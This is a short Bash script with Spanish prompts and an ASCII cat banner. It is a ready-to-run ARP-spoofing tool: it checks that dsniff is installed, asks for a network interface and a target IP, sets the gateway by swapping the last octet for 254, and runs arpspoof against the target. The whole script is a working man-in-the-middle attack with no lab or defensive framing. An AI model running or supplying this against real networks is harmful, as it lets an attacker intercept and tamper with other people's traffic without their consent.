#!/bin/bash

echo -e "\033[93mCreado por briancgx, inspirado en 'El pinguino de Mario'\033[0m"

cat << "EOF"
  /\_/\
 ( o.o )
  > ^ <
EOF

check_herramienta() {
  if ! [ -x "$(command -v $1)" ]; then
    echo "Error: $1 no esta instalado. Por favor, instala $1 y vuelve a intentarlo." >&2
    exit 1
  fi
}

check_herramienta "dsniff"

read -p "Inserte la interfaz de red que quieras analizar: " interfaz
read -p "Inserte la IP objetivo: " ip

puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/254/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
